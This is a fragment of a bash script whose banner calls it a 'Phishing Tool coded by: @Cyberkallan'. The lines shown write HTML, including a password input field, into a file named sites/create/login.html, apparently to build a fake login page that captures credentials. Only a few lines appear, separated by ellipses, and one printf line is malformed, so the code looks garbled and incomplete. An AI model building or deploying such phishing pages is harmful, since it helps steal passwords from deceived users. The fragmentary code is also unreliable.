...
printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by: @Cyberkallan \e[0m\e[1;93m.:.:.\e[0m\n"
printf "\n"
}
...
IFS=$'\n'
printf '<input type="password" name="password" length=64>< sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html
